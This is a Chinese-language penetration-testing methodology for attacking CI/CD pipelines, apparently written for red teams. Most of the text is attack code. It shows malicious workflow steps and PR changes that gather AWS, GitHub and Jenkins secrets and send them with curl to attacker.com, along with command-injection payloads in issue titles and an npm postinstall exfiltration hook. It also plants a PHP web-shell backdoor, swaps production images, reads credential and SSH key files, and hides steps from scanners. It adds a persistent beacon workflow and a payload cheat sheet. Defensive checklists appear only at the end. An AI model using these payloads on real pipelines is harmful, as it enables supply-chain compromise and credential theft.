# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化、可复现的 CI/CD 管道攻击（CI/CD Pipeline Attack）测试与利用流程。通过本方法论，测试人员能够系统性地检测和利用持续集成/持续部署管道中的安全漏洞，包括构建脚本篡改、凭证窃取、构建缓存污染、部署劫持等技术。

## 1.2 适用范围

本文档适用于以下场景：
- 使用 GitHub Actions、GitLab CI、Jenkins、CircleCI 等 CI/CD 平台的环境
- 自动化构建和部署流程
- 容器镜像构建和发布流程
- 基础设施即代码（IaC）的自动化部署
- 代码审查和合并流程

## 1.3 读者对象

本文档主要面向：
- 执行渗透测试任务的安全工程师
- 进行 DevSecOps 评估的顾问
- 负责 CI/CD 安全的技术人员
- 红队成员进行供应链攻击演练

---

# 第二部分：核心渗透技术专题

## 专题一：CI/CD 管道攻击

### 2.1 技术介绍

CI/CD 管道攻击（CI/CD Pipeline Attack）是针对持续集成/持续部署系统的攻击，攻击者通过篡改构建流程、窃取敏感凭证或污染构建产物，实现对目标组织的深度渗透。

**攻击原理：**
- **构建脚本篡改：** 修改 CI/CD 配置文件，在构建过程中植入恶意代码
- **凭证窃取：** 利用 CI/CD 环境中存储的凭证访问其他系统
- **构建缓存污染：** 污染构建缓存，影响后续构建
- **依赖注入：** 在构建过程中注入恶意依赖
- **部署劫持：** 控制部署流程，将恶意代码部署到生产环境
- **PR 攻击：** 通过恶意 Pull Request 触发敏感操作

**本质：** CI/CD 系统通常拥有较高的权限和广泛的系统访问能力，一旦失守将成为攻击者的"黄金通道"。

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **开源项目** | 接受外部 PR 贡献 | 恶意 PR 窃取仓库凭证 |
| **企业 CI/CD** | 自动化构建部署 | Jenkins 未授权访问 |
| **容器构建** | Docker 镜像构建 | Docker Hub 凭证泄露 |
| **云部署** | AWS/GCP/Azure 部署 | 云凭证存储在 CI/CD 中 |
| **代码签名** | 自动代码签名 | 签名证书/密钥泄露 |
| **包发布** | npm/PyPI 自动发布 | 发布凭证泄露 |
| **基础设施部署** | Terraform/CloudFormation | IaC 凭证泄露 |
| **安全扫描** | 自动化安全测试 | 扫描工具凭证泄露 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**CI/CD 平台识别：**

1. **识别 CI/CD 服务**
   ```bash
   # 检查常见 CI/CD 配置文件
   .github/workflows/*.yml      # GitHub Actions
   .gitlab-ci.yml               # GitLab CI
   Jenkinsfile                  # Jenkins
   circle.yml                   # CircleCI
   .travis.yml                  # Travis CI
   azure-pipelines.yml          # Azure Pipelines
   buildkite.yml                # Buildkite
   ```

2. **检查公开的工作流文件**
   ```bash
   # GitHub
   curl https://raw.githubusercontent.com/target/repo/main/.github/workflows/ci.yml
   
   # GitLab
   curl https://gitlab.com/target/repo/raw/main/.gitlab-ci.yml
   ```

3. **分析 CI/CD 环境变量**
   - 检查是否泄露敏感环境变量名
   - 分析日志输出中的环境信息

#### 2.3.2 白盒测试

**代码审计要点：**

1. **审查 CI/CD 配置文件**
   ```yaml
   # 危险模式：PR 触发时暴露凭证
   name: CI
   on:
     pull_request:
       branches: [main]
   jobs:
     build:
       runs-on: ubuntu-latest
       steps:
         - uses: actions/checkout@v2
         - name: Deploy
           env:
             AWS_SECRET_KEY: ${{ secrets.AWS_SECRET_KEY }}  # 危险！
           run: ./deploy.sh
   ```

2. **检查凭证存储方式**
   - Jenkins Credentials
   - GitHub Secrets
   - GitLab CI Variables
   - 环境变量文件

3. **审计构建脚本**
   ```bash
   # 检查是否有命令注入风险
   # 危险模式：使用用户可控输入
   run: echo "Building PR ${{ github.event.pull_request.number }}"
   run: npm install ${{ github.event.head_commit.message }}
   ```

### 2.4 漏洞利用方法

#### 2.4.1 恶意 PR 攻击

**攻击场景：** 开源项目接受外部贡献

**攻击步骤：**

```bash
# 步骤 1：Fork 目标仓库
git clone https://github.com/target/project.git

# 步骤 2：创建恶意分支
git checkout -b feature/malicious-feature

# 步骤 3：修改 CI/CD 配置，添加凭证窃取
cat >> .github/workflows/ci.yml << EOF

    - name: Debug Info
      run: |
        echo "AWS_ACCESS_KEY=$AWS_ACCESS_KEY_ID" >> /tmp/creds.txt
        echo "AWS_SECRET_KEY=$AWS_SECRET_ACCESS_KEY" >> /tmp/creds.txt
        curl -X POST -d @/tmp/creds.txt http://attacker.com/exfil
EOF

# 步骤 4：提交并创建 PR
git commit -am "Add debug info for CI"
git push origin feature/malicious-feature
# 然后创建 Pull Request
```

#### 2.4.2 命令注入攻击

**利用 CI/CD 中的命令注入：**

```yaml
# 危险配置示例
name: Build
on:
  issues:
    types: [opened]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # 危险：直接使用 issue title 作为命令参数
      - name: Process Issue
        run: |
          echo "Processing: ${{ github.event.issue.title }}"
          # 攻击者可以提交恶意 title: "; curl attacker.com/$(cat /etc/passwd)"
```

**Payload 示例：**
```
# Issue Title Payload
正常标题"; curl http://attacker.com/exfil?data=$(whoami)
```

#### 2.4.3 构建缓存污染

**攻击步骤：**

```bash
# 步骤 1：污染 npm 缓存
cat >> package.json << EOF
{
  "scripts": {
    "postinstall": "curl http://attacker.com/exfil?env=\$(env)"
  }
}
EOF

# 步骤 2：提交到共享依赖缓存
# 当其他构建使用相同缓存时，恶意代码将执行
```

**Docker 层缓存污染：**
```dockerfile
# 在 Dockerfile 中植入恶意层
RUN echo "malicious script" >> /etc/profile
# 该层将被缓存并影响后续构建
```

#### 2.4.4 凭证窃取技术

**常见 CI/CD 环境变量窃取：**

```yaml
# GitHub Actions
- name: Exfiltrate Secrets
  run: |
    # 窃取 GitHub Secrets
    echo "GH_TOKEN=$GH_TOKEN" >> /tmp/secrets
    echo "DEPLOY_KEY=$DEPLOY_KEY" >> /tmp/secrets
    
    # 窃取云凭证
    echo "AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID" >> /tmp/secrets
    echo "AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY" >> /tmp/secrets
    
    # 外带数据
    base64 /tmp/secrets | curl -X POST -d @- http://attacker.com/exfil
```

**Jenkins 凭证窃取：**
```groovy
// Jenkins Pipeline 凭证窃取
pipeline {
    agent any
    stages {
        stage('Exfil') {
            steps {
                script {
                    // 获取所有 Jenkins 凭证
                    def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
                        com.cloudbees.plugins.credentials.common.StandardCredentials.class,
                        Jenkins.instance,
                        null,
                        null
                    )
                    creds.each { println it.id + ": " + it.description }
                    
                    // 外带
                    sh 'curl http://attacker.com/exfil?creds=' + URLEncoder.encode(creds.toString())
                }
            }
        }
    }
}
```

#### 2.4.5 部署劫持

**攻击步骤：**

```yaml
# 篡改部署工作流
name: Deploy
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      # 攻击者添加的恶意步骤
      - name: Backdoor
        run: |
          # 在部署包中添加后门
          echo "<?php system(\$_GET['cmd']); ?>" >> src/backdoor.php
          
          # 或者替换部署的容器镜像
          docker pull attacker/malicious-image:latest
          docker tag attacker/malicious-image:latest target/production:latest
```

#### 2.4.6 信息收集命令

```bash
# CI/CD 环境信息收集
env | sort
printenv

# 检查已安装工具
which aws gcloud az kubectl docker
which npm pip mvn gradle

# 检查配置文件
cat ~/.aws/credentials
cat ~/.docker/config.json
cat ~/.kube/config
cat ~/.ssh/id_rsa

# 检查环境变量中的凭证
echo $AWS_ACCESS_KEY_ID
echo $GCP_CREDENTIALS
echo $KUBECONFIG
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过分支保护

**方法 1：利用不受保护的分支**
```yaml
# 针对未设置分支保护的工作流
on:
  push:
    branches:
      - 'feature/*'  # 所有 feature 分支都触发
      - 'test/*'     # 测试分支
```

**方法 2：利用标签触发**
```yaml
on:
  push:
    tags:
      - '*'  # 所有标签都触发
```

#### 2.5.2 绕过凭证保护

**方法 1：利用日志输出**
```yaml
# 通过调试输出泄露凭证
- name: Debug
  run: |
    echo "Debug mode enabled"
    printenv  # 可能包含凭证
    env       # 可能包含凭证
```

**方法 2：利用错误信息**
```yaml
# 故意触发错误，在错误信息中泄露凭证
- name: Trigger Error
  run: |
    aws s3 ls s3://non-existent-bucket 2>&1 | head -100
    # AWS CLI 错误可能包含凭证信息
```

#### 2.5.3 绕过安全扫描

**方法 1：条件执行**
```yaml
- name: Malicious Step
  if: github.repository == 'target/production'  # 只在生产仓库执行
  run: curl http://attacker.com/exfil?data=$(env)
```

**方法 2：隐蔽执行**
```yaml
- name: Build Optimization
  run: |
    # 将恶意命令隐藏在正常构建命令中
    npm run build && curl -s http://attacker.com/ping
```

#### 2.5.4 持久化技术

**GitHub Actions 持久化：**
```yaml
# 创建新的工作流文件
- name: Persist
  run: |
    mkdir -p .github/workflows
    cat > .github/workflows/backdoor.yml << EOF
name: Backdoor
on:
  schedule:
    - cron: '0 */6 * * *'  # 每 6 小时执行
jobs:
  beacon:
    runs-on: ubuntu-latest
    steps:
      - run: curl http://attacker.com/beacon
EOF
    git config user.name "CI Bot"
    git config user.email "ci@target.com"
    git add .github/workflows/backdoor.yml
    git commit -m "Add maintenance workflow"
    git push
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | 目标 | Payload 示例 | 说明 |
|-----|------|------------|------|
| **命令注入** | PR Title | `"; curl http://attacker.com/$(whoami)` | 利用 issue/pr title |
| **命令注入** | Commit Message | `build: fix; curl attacker.com/$(env)` | 利用 commit message |
| **凭证窃取** | GitHub Actions | `echo "$AWS_SECRET_ACCESS_KEY" \| curl -X POST -d @- http://attacker.com` | 窃取 AWS 凭证 |
| **凭证窃取** | Jenkins | `println(System.getenv("PASSWORD"))` | 窃取 Jenkins 环境变量 |
| **缓存污染** | npm | `"postinstall": "curl attacker.com/hook"` | 污染 npm 缓存 |
| **部署劫持** | Docker | `docker tag attacker/mal:latest target/prod:latest` | 替换生产镜像 |

## 3.2 CI/CD 平台安全特性对比

| 平台 | Secrets 管理 | 分支保护 | 审计日志 | 环境隔离 |
|-----|------------|---------|---------|---------|
| **GitHub Actions** | Repository/Org Secrets | Branch Protection Rules | Audit Log | Environments |
| **GitLab CI** | CI/CD Variables | Protected Branches | Audit Events | Protected Environments |
| **Jenkins** | Credentials Plugin | Branch Source Plugin | Audit Trail Plugin | Folder-level Security |
| **CircleCI** | Context/Environment | N/A | Audit Log | Project-level |
| **Azure Pipelines** | Variable Groups | Branch Policies | Audit Logs | Environments |

## 3.3 CI/CD 安全检查清单

- [ ] CI/CD 配置文件不接受未信任的输入
- [ ] Secrets 使用平台提供的安全存储
- [ ] 分支保护规则已启用
- [ ] PR 来自 fork 仓库时限制凭证访问
- [ ] 构建日志不包含敏感信息
- [ ] 依赖安装使用锁文件
- [ ] 容器镜像有签名验证
- [ ] 部署需要人工审批
- [ ] 审计日志已启用并定期审查
- [ ] CI/CD Runner 使用最小权限

## 3.4 防御建议

1. **最小权限原则**：CI/CD 凭证仅授予完成任务所需的最小权限
2. **分支保护**：对主分支启用保护，要求代码审查
3. **Fork 限制**：限制 fork 仓库 PR 的凭证访问
4. **依赖锁定**：使用锁文件确保依赖一致性
5. **镜像签名**：对构建的容器镜像进行签名
6. **审计日志**：启用并监控 CI/CD 审计日志
7. **定期轮换**：定期轮换 CI/CD 中存储的所有凭证
8. **环境隔离**：生产环境部署需要额外审批
9. **输入验证**：对所有用户可控输入进行严格验证
10. **安全培训**：对开发团队进行 CI/CD 安全培训
